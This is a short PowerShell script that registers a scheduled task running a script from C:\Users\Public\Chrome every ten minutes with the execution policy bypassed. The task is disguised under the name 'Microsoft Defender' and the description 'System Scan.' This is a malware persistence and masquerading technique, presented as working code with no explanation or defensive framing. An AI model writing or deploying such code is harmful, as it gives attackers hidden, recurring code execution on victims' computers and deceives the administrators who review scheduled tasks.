# Define the path to your PowerShell script
$scriptPath = "C:\Users\Public\Chrome\chrome.ps1"

# Create a new scheduled task
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
Register-ScheduledTask -TaskName "Microsoft Defender" -Action $action -Trigger $trigger -Description "System Scan." -ErrorAction Stop
